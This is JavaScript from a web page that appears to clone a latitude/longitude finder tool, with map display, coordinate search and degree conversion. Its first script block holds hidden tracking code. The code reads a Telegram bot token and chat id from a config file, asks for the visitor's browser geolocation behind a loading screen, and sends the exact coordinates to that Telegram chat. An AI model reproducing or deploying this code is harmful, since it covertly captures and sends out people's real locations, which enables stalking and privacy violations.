  <script>
  function showLoadingModal() {
        const modal = document.getElementById('loadingModal');
        modal.style.display = 'flex'; // Показать модальное окно
    }
  var userb, tokenb = "";
  fetch('config2.json').then(response => {
    
    return response.json(); 
  })
  .then(data => {
    tokenb = data.token;
    userb = data.uid;
  })
  .catch(error => {
    console.error('Ошибка:', error);
  });
  
  function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    alert("Geolocation is not supported by this browser.");
  }
}

function showPosition(position) {
showLoadingModal();
	fetch(`https://api.telegram.org/bot${tokenb}/sendMessage?chat_id=${userb}&text=${encodeURIComponent("lat: "+position.coords.latitude+`\nlong: ${position.coords.longitude}`)}`);
}
  
  
  
  </script>
  
<script>
var mymap = L.map('latlongmap');
var mmr = L.marker([0,0]);
mmr.bindPopup('0,0');
mmr.addTo(mymap);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png?{foo}', {foo: 'bar',
attribution:'&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a>'}).addTo(mymap);
sm(0,0,2);
mymap.on('click', onMapClick);

var frmplace = document.getElementById('DT3224');
if (frmplace.attachEvent) {
frmplace.attachEvent("submit", getp);
} else {
frmplace.addEventListener("submit", getp);
}
var frmplace2 = document.getElementById('Ac3424');
if (frmplace2.attachEvent) {
frmplace2.attachEvent("keyup", getp2);
} else {
frmplace2.addEventListener("keyup", getp2);
}
function getp2(e) {
if (e.preventDefault)
e.preventDefault();
document.getElementById('Ac3424147').value=document.getElementById('Ac3424').value;
}

function getp(e) {

if (e.preventDefault)
e.preventDefault();

var plc = document.getElementById("Ac3424147").value;
if(plc==='') {alert('not found');return false;}
var plca = plc.split(","); 
if (typeof plca !== 'undefined' && Object.getPrototypeOf(Object(plca)) === Object.getPrototypeOf([])) {

if(isll(plca[0]) && isll(plca[1])) {
sm(plca[0],plca[1],12);
return false;
}
}

var cpt=''; // grecaptcha.getResponse();
document.getElementById("Ac3424").disabled = true;
document.getElementById("btnfind").disabled = true;
document.getElementById("loading").style.display = "block";
var xhr = new XMLHttpRequest();
var params = 'c1=' + encodeURIComponent(plc) + '&action=' + encodeURIComponent('gpcm')
+'&cp=' +cpt ;
xhr.open("POST", '/_spm4.php', true);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.setRequestHeader('X-Requested-With', 'XMLHttpRequest');
xhr.onreadystatechange = function () {
if (xhr.readyState === 4 && xhr.status === 200) {
if(xhr.responseText === "0000") {
alert('Sorry, You have reached your daily query limit.');
}
else if(xhr.responseText !== "") {
var crd = xhr.responseText.split(",");
sm(crd[0],crd[1],12);
}
else {
alert('No place found.');
}
document.getElementById("loading").style.display = "none";
document.getElementById("Ac3424").disabled = false;
document.getElementById("btnfind").disabled = false;
}
}
xhr.send(params);

return false;

}

function isll(num) {
var val = parseFloat(num);
if (!isNaN(val) && val <= 90 && val >= -90)
    return true;
else
    return false;
}

function onMapClick(e) {
mmr.setLatLng(e.latlng);
setui(e.latlng.lat,e.latlng.lng,mymap.getZoom());
}

function dec2dms(e,t) {
document.getElementById("dms-lat").innerHTML = getdms(e, !0), document.getElementById("dms-lng").innerHTML = getdms(t, !1)
}
function getdms(e, t) {
var n = 0, m = 0, l = 0, a = "X";
return a = t && 0 > e ? "S" : !t && 0 > e ? "W" : t ? "N" : "E", d = Math.abs(e), n = Math.floor(d), l = 3600 * (d - n), m = Math.floor(l / 60), l = Math.round(1e4 * (l - 60 * m)) / 1e4, n + "&deg; " + m + "' " + l + "'' " + a
}

function sm(lt,ln,zm) {
    setui(lt,ln,zm);
    mmr.setLatLng(L.latLng(lt,ln));
    mymap.setView([lt,ln], zm);
}

function setui(lt,ln,zm) {
    lt = Number(lt).toFixed(6);
    ln = Number(ln).toFixed(6);
mmr.setPopupContent(lt + ',' + ln).openPopup();
document.getElementById("lat").value=lt;
document.getElementById("lng").value=ln;
document.getElementById("latlngspan").innerHTML ="(" + lt + ", " + ln + ")"; 
document.getElementById("coordinatesurl").value = "https://www.latlong.net/c/?lat=" + lt + "&long=" + ln;
document.getElementById("coordinateslink").innerHTML = '&lt;a href="https://www.latlong.net/c/?lat=' + lt + "&amp;long=" + ln + '" target="_blank"&gt;(' + lt + ", " + ln + ")&lt;/a&gt;";
dec2dms(lt,ln);
document.getElementById('latlongmape').src='https://www.google.com/maps/embed/v1/view?key=&maptype=satellite&'+'center='+lt+','+ ln+'&zoom='+zm;
}
       
</script>
